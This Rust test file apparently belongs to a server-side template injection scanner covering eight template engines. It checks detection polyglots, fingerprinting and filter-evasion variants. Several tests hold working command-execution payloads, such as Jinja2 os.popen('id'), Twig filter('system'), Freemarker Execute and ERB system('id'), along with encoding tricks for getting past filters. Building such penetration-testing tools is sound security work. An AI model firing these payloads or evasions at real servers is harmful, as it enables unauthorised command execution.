use super::ssti_polyglot::*;

#[test]
fn engine_count_at_least_seven() {
    let engine = SstiPolyglotEngine::new();
    assert!(engine.supported_engine_count() >= 7);
}

#[test]
fn engine_count_is_eight() {
    assert_eq!(TemplateEngine::ALL.len(), 8);
}

#[test]
fn detection_polyglot_triggers_multiple_engines() {
    let engine = SstiPolyglotEngine::new();
    let poly = engine.detection_polyglot();
    let trigger_markers = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{=7*7}}"];
    let matched: usize = trigger_markers.iter().filter(|m| poly.contains(*m)).count();
    assert!(
        matched >= 5,
        "Polyglot must trigger >=5 engine syntaxes, got {matched}"
    );
}

#[test]
fn detection_payloads_non_empty() {
    let engine = SstiPolyglotEngine::new();
    assert!(!engine.detection_payloads().is_empty());
    assert!(engine.detection_payloads().len() >= 8);
}

#[test]
fn detection_payloads_include_polyglot() {
    let engine = SstiPolyglotEngine::new();
    let has_polyglot = engine
        .detection_payloads()
        .iter()
        .any(|p| p.engine.is_none() && p.category == PayloadCategory::Detection);
    assert!(
        has_polyglot,
        "Must include universal polyglot in detection payloads"
    );
}

#[test]
fn detection_payloads_cover_all_engines() {
    let engine = SstiPolyglotEngine::new();
    for te in TemplateEngine::ALL {
        let found = engine
            .detection_payloads()
            .iter()
            .any(|p| p.engine == Some(*te));
        assert!(found, "Missing detection payload for engine {te}");
    }
}

#[test]
fn fingerprint_jinja2_string_multiplication() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("7777777");
    let jinja_match = results.iter().any(|r| r.engine == TemplateEngine::Jinja2);
    assert!(
        jinja_match,
        "Should fingerprint Jinja2 from '7777777' response"
    );
}

#[test]
fn fingerprint_twig_numeric_coercion() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("49");
    let twig_match = results.iter().any(|r| r.engine == TemplateEngine::Twig);
    assert!(twig_match, "Should fingerprint Twig from '49' response");
}

#[test]
fn fingerprint_freemarker_version() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("2.3.31");
    let fm_match = results
        .iter()
        .any(|r| r.engine == TemplateEngine::Freemarker);
    assert!(
        fm_match,
        "Should fingerprint Freemarker from version response"
    );
}

#[test]
fn fingerprint_erb_binding() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("Binding");
    let erb_match = results.iter().any(|r| r.engine == TemplateEngine::Erb);
    assert!(
        erb_match,
        "Should fingerprint ERB from 'Binding' in response"
    );
}

#[test]
fn fingerprint_mako_context() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("Context");
    let mako_match = results.iter().any(|r| r.engine == TemplateEngine::Mako);
    assert!(
        mako_match,
        "Should fingerprint Mako from 'Context' in response"
    );
}

#[test]
fn fingerprint_pebble_uppercase() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("FOO");
    let pebble_match = results.iter().any(|r| r.engine == TemplateEngine::Pebble);
    assert!(
        pebble_match,
        "Should fingerprint Pebble from 'FOO' in response"
    );
}

#[test]
fn fingerprint_handlebars_function() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("function Function()");
    let hbs_match = results
        .iter()
        .any(|r| r.engine == TemplateEngine::Handlebars);
    assert!(
        hbs_match,
        "Should fingerprint Handlebars from 'function' in response"
    );
}

#[test]
fn fingerprint_velocity_49() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("49");
    let vel_match = results.iter().any(|r| r.engine == TemplateEngine::Velocity);
    assert!(
        vel_match,
        "Should fingerprint Velocity from '49' in response"
    );
}

#[test]
fn fingerprint_results_sorted_by_confidence() {
    let engine = SstiPolyglotEngine::new();
    let results =
        engine.fingerprint_response("49 7777777 FOO Context Binding function [object Object]");
    if results.len() >= 2 {
        for pair in results.windows(2) {
            assert!(
                pair[0].confidence >= pair[1].confidence,
                "Results should be sorted descending by confidence"
            );
        }
    }
}

#[test]
fn fingerprint_no_match_on_random_body() {
    let engine = SstiPolyglotEngine::new();
    let results = engine.fingerprint_response("Hello world, nothing suspicious here.");
    let high_confidence: Vec<_> = results.iter().filter(|r| r.confidence > 0.70).collect();
    assert!(
        high_confidence.is_empty(),
        "Random body should not yield high-confidence matches"
    );
}

#[test]
fn exploit_payloads_per_engine() {
    let engine = SstiPolyglotEngine::new();
    for te in TemplateEngine::ALL {
        let exploits = engine.exploit_payloads(*te);
        assert!(
            exploits.len() >= 2,
            "Engine {te} should have >=2 exploit payloads, got {}",
            exploits.len()
        );
    }
}

#[test]
fn exploit_payloads_all_are_exploitation_category() {
    let engine = SstiPolyglotEngine::new();
    for payload in engine.all_exploit_payloads() {
        assert_eq!(payload.category, PayloadCategory::Exploitation);
    }
}

#[test]
fn all_exploit_payloads_non_empty() {
    let engine = SstiPolyglotEngine::new();
    assert!(engine.all_exploit_payloads().len() >= 20);
}

#[test]
fn evasion_at_least_three_per_engine() {
    let engine = SstiPolyglotEngine::new();
    for te in TemplateEngine::ALL {
        let techniques = engine.evasion_techniques(*te);
        assert!(
            techniques.len() >= 3,
            "Engine {te} should have >=3 evasion techniques, got {}",
            techniques.len()
        );
    }
}

#[test]
fn evade_produces_variants_for_jinja2() {
    let engine = SstiPolyglotEngine::new();
    let base = "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}";
    let evaded = engine.evade(TemplateEngine::Jinja2, base);
    assert!(
        evaded.len() >= 3,
        "Should produce at least 3 Jinja2 evasion variants"
    );
    let changed_count = evaded.iter().filter(|v| v.raw != base).count();
    assert!(
        changed_count >= 3,
        "At least 3 evasion variants must differ from original, got {changed_count}"
    );
    for variant in &evaded {
        assert_eq!(variant.category, PayloadCategory::Evasion);
        assert!(variant.evasion.is_some());
    }
}

#[test]
fn evade_produces_variants_for_twig() {
    let engine = SstiPolyglotEngine::new();
    let base = "{{['id']|filter('system')}}";
    let evaded = engine.evade(TemplateEngine::Twig, base);
    assert!(evaded.len() >= 3);
    for variant in &evaded {
        assert_eq!(variant.engine, Some(TemplateEngine::Twig));
    }
}

#[test]
fn evade_produces_variants_for_freemarker() {
    let engine = SstiPolyglotEngine::new();
    let base = "${\"freemarker.template.utility.Execute\"?new()(\"id\")}";
    let evaded = engine.evade(TemplateEngine::Freemarker, base);
    assert!(evaded.len() >= 3);
}

#[test]
fn evade_produces_variants_for_velocity() {
    let engine = SstiPolyglotEngine::new();
    let base = "#set($e=\"exp\")$e.getClass().forName(\"java.lang.Runtime\")";
    let evaded = engine.evade(TemplateEngine::Velocity, base);
    assert!(evaded.len() >= 3);
}

#[test]
fn evade_produces_variants_for_mako() {
    let engine = SstiPolyglotEngine::new();
    let base = "${__import__('os').popen('id').read()}";
    let evaded = engine.evade(TemplateEngine::Mako, base);
    assert!(evaded.len() >= 3);
}

#[test]
fn evade_produces_variants_for_erb() {
    let engine = SstiPolyglotEngine::new();
    let base = "<%= system('id') %>";
    let evaded = engine.evade(TemplateEngine::Erb, base);
    assert!(evaded.len() >= 3);
}

#[test]
fn evade_produces_variants_for_handlebars() {
    let engine = SstiPolyglotEngine::new();
    let base = "{{constructor.constructor('return process')()}}";
    let evaded = engine.evade(TemplateEngine::Handlebars, base);
    assert!(evaded.len() >= 3);
}

#[test]
fn evade_produces_variants_for_pebble() {
    let engine = SstiPolyglotEngine::new();
    let base = "{{beans.get('environment')}}";
    let evaded = engine.evade(TemplateEngine::Pebble, base);
    assert!(evaded.len() >= 3);
}

#[test]
fn unicode_evasion_modifies_class_keyword() {
    let engine = SstiPolyglotEngine::new();
    let base = "{{ ''.__class__.__mro__[2] }}";
    let evaded = engine.evade(TemplateEngine::Jinja2, base);
    let unicode_variant = evaded
        .iter()
        .find(|v| v.evasion == Some(EvasionTechnique::UnicodeNormalization));
    assert!(unicode_variant.is_some());
    assert!(
        unicode_variant.unwrap().raw.contains('\u{FF3F}'),
        "Unicode evasion should replace underscores"
    );
}

#[test]
fn url_encoding_evasion_encodes_braces() {
    let engine = SstiPolyglotEngine::new();
    let base = "${7*7}";
    let evaded = engine.evade(TemplateEngine::Freemarker, base);
    let url_variant = evaded
        .iter()
        .find(|v| v.evasion == Some(EvasionTechnique::UrlEncoding));
    assert!(url_variant.is_some());
    assert!(
        url_variant.unwrap().raw.contains("%7B"),
        "URL evasion should encode curly braces"
    );
}

#[test]
fn template_engine_display_formatting() {
    assert_eq!(format!("{}", TemplateEngine::Jinja2), "Jinja2");
    assert_eq!(format!("{}", TemplateEngine::Twig), "Twig");
    assert_eq!(format!("{}", TemplateEngine::Freemarker), "Freemarker");
    assert_eq!(format!("{}", TemplateEngine::Mako), "Mako");
    assert_eq!(format!("{}", TemplateEngine::Erb), "ERB");
    assert_eq!(format!("{}", TemplateEngine::Handlebars), "Handlebars");
    assert_eq!(format!("{}", TemplateEngine::Velocity), "Velocity");
    assert_eq!(format!("{}", TemplateEngine::Pebble), "Pebble");
}

#[test]
fn evasion_technique_display_formatting() {
    assert_eq!(
        format!("{}", EvasionTechnique::UnicodeNormalization),
        "unicode-normalization"
    );
    assert_eq!(format!("{}", EvasionTechnique::UrlEncoding), "url-encoding");
    assert_eq!(
        format!("{}", EvasionTechnique::DoubleUrlEncoding),
        "double-url-encoding"
    );
}

#[test]
fn fingerprint_probes_available_per_engine() {
    let engine = SstiPolyglotEngine::new();
    for te in TemplateEngine::ALL {
        let probes = engine.fingerprint_probes(*te);
        assert!(
            probes.len() >= 2,
            "Engine {te} should have >=2 fingerprint probes, got {}",
            probes.len()
        );
    }
}

#[test]
fn default_trait_creates_valid_engine() {
    let engine = SstiPolyglotEngine::default();
    assert!(engine.supported_engine_count() >= 7);
    assert!(!engine.detection_payloads().is_empty());
}

#[test]
fn payload_descriptions_are_non_empty() {
    let engine = SstiPolyglotEngine::new();
    for p in engine.detection_payloads() {
        assert!(
            !p.description.is_empty(),
            "Detection payload description must not be empty"
        );
    }
    for p in engine.all_exploit_payloads() {
        assert!(
            !p.description.is_empty(),
            "Exploit payload description must not be empty"
        );
    }
}

#[test]
fn exploit_payloads_have_engine_set() {
    let engine = SstiPolyglotEngine::new();
    for p in engine.all_exploit_payloads() {
        assert!(
            p.engine.is_some(),
            "Exploit payload must have engine set: {}",
            p.description
        );
    }
}

#[test]
fn jinja2_exploit_contains_mro_chain() {
    let engine = SstiPolyglotEngine::new();
    let jinja_exploits = engine.exploit_payloads(TemplateEngine::Jinja2);
    let has_mro = jinja_exploits.iter().any(|p| p.raw.contains("__mro__"));
    assert!(
        has_mro,
        "Jinja2 exploits should contain MRO chain traversal"
    );
}

#[test]
fn freemarker_exploit_contains_execute_class() {
    let engine = SstiPolyglotEngine::new();
    let fm_exploits = engine.exploit_payloads(TemplateEngine::Freemarker);
    let has_exec = fm_exploits.iter().any(|p| p.raw.contains("Execute"));
    assert!(
        has_exec,
        "Freemarker exploits should contain Execute utility class"
    );
}

#[test]
fn velocity_exploit_contains_runtime_reflection() {
    let engine = SstiPolyglotEngine::new();
    let vel_exploits = engine.exploit_payloads(TemplateEngine::Velocity);
    let has_runtime = vel_exploits.iter().any(|p| p.raw.contains("Runtime"));
    assert!(
        has_runtime,
        "Velocity exploits should contain Runtime reflection"
    );
}

#[test]
fn double_url_encoding_applies_257() {
    let engine = SstiPolyglotEngine::new();
    let base = "${7*7}";
    let evaded = engine.evade(TemplateEngine::Velocity, base);
    let double_url = evaded
        .iter()
        .find(|v| v.evasion == Some(EvasionTechnique::DoubleUrlEncoding));
    assert!(
        double_url.is_some(),
        "Velocity should have double URL encoding evasion"
    );
    assert!(double_url.unwrap().raw.contains("%257B"));
}

#[test]
fn comment_injection_for_velocity_inserts_comment() {
    let engine = SstiPolyglotEngine::new();
    let base = "#set($x=1)$x";
    let evaded = engine.evade(TemplateEngine::Velocity, base);
    let comment_var = evaded
        .iter()
        .find(|v| v.evasion == Some(EvasionTechnique::CommentInjection));
    assert!(comment_var.is_some());
    assert!(comment_var.unwrap().raw.contains("#*comment*#"));
}

#[test]
fn whitespace_insertion_for_erb() {
    let engine = SstiPolyglotEngine::new();
    let base = "<%= system('id') %>";
    let evaded = engine.evade(TemplateEngine::Erb, base);
    let ws_var = evaded
        .iter()
        .find(|v| v.evasion == Some(EvasionTechnique::WhitespaceInsertion));
    assert!(ws_var.is_some());
    assert!(ws_var.unwrap().raw.contains("<%=\t"));
}
